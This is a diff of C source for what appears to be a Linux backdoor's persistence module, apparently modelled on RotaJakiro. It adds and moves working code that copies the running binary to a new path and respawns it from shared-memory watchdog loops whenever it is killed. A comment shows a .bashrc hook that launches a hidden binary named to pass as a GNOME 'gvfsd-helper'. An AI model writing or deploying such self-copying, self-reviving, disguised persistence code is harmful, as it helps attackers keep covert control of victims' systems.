@@ -7,11 +7,39 @@
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <sys/shm.h>
+#include <sys/wait.h>
 #include <pthread.h>
 
 // custom headers
 #include "persistence.h"
 #include "utils.h"
+
+bool copy_rota_to_userland(char *destpath) {
+    struct stat procstru;
+    int fsize;
+
+    // allocating file size to copy data to destination buffer.
+    stat("/proc/self/exe", &procstru);
+    fsize = procstru.st_size;
+    char *exe = (char *)malloc(fsize);
+
+    // copy data from /proc/self/exe into exe buffer.
+    int fd  = open("/proc/self/exe", O_RDONLY);
+    read(fd, exe, fsize);
+    close(fd);
+
+    // write binary to new location specified by destpath
+    int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
+    int bytesWritten = write(fout, exe, fsize);
+    free(exe);
+
+    // if bytes written == size of file
+    if (bytesWritten == fsize) {
+        return true;
+    }
+
+    return false;
+}
 
 
 bool nonroot_bashrc_persistence() {
@@ -24,8 +52,6 @@ bool nonroot_bashrc_persistence() {
     * if [ -d ${HOME} ]; then
     *     ${HOME}/.gvfsd/.profile/gvfsd-helper
     * fi
-    *
-    *
     *
     * */
 
@@ -248,32 +274,23 @@ bool monitor_proc(char *pid) {
     }
 }
 
-bool copy_rota_to_userland(char *destpath) {
-    struct stat procstru;
-    int fsize;
+void fork_exec(char *fpath) {
 
-    // allocating file size to copy data to destination buffer.
-    stat("/proc/self/exe", &procstru);
-    fsize = procstru.st_size;
-    char *exe = (char *)malloc(fsize);
+    int wstatus;
+    int res = fork();
 
-    // copy data from /proc/self/exe into exe buffer.
-    int fd  = open("/proc/self/exe", O_RDONLY);
-    read(fd, exe, fsize);
-    close(fd);
-
-    // write binary to new location specified by destpath
-    int fout  = open(destpath, O_CREAT|O_WRONLY, 0755);
-    int bytesWritten = write(fout, exe, fsize);
-    free(exe);
-
-    // if bytes written == size of file
-    if (bytesWritten == fsize) {
-        return true;
+    if (res < 0) {
+        exit(1);
+    }
+    if (res == 0){
+        // child process to execvp;
+        execvp(fpath, NULL);
     }
 
-    return false;
+    waitpid(res, &wstatus, 0);
+
 }
+
 
 void watchdog_process_shmget(char *fpath){
 
@@ -286,7 +303,7 @@ void watchdog_process_shmget(char *fpath){
     int shmid = shmget(0x64b2e2, 8, IPC_CREAT |0666);
     if (shmid <= 0) {
         fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
-            //execvp(fpath, NULL);
+        fork_exec(fpath);
     }
 
     // write PID to sharedmem
@@ -305,7 +322,7 @@ void watchdog_process_shmget(char *fpath){
         //if proc not there, exec into existence
         if (proc_alive == false) {
             fprintf(stderr, "[shmget] process is not alive! spawning\n");
-            //execvp(fpath, NULL);
+            fork_exec(fpath);
         }
 
         sleep(3);
@@ -328,7 +345,7 @@ void watchdog_process_shmread(char *fpath) {
         int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
         if (shmid <= 0) {
             fprintf(stderr, "\n[wathcdog_process_shmread] %s\n", strerror(errno));
-            execvp(fpath, NULL);
+            fork_exec(fpath);
         }
 
         // get pid from shared memory.
@@ -338,11 +355,11 @@ void watchdog_process_shmread(char *fpath) {
         //if proc pid entry not there, exec into existence
         if (proc_alive == false) {
             fprintf(stderr, "[shmread] process is not alive! spawning\n");
-            execvp(fpath, NULL);
+            fork_exec(fpath);
         }
         // if process dies execute
         if (!access(fpath, F_OK)) {
-            execvp(fpath, NULL);
+            fork_exec(fpath);
         }
 
         sleep(3);
@@ -352,8 +369,7 @@ void watchdog_process_shmread(char *fpath) {
 }
 
 
-void spawn_thread_watchdog(int uid, char *fpath)
-{
+void spawn_thread_watchdog(int uid, char *fpath) {
     pthread_t threadid;
     if (uid == 0){
         // "the parent thread"
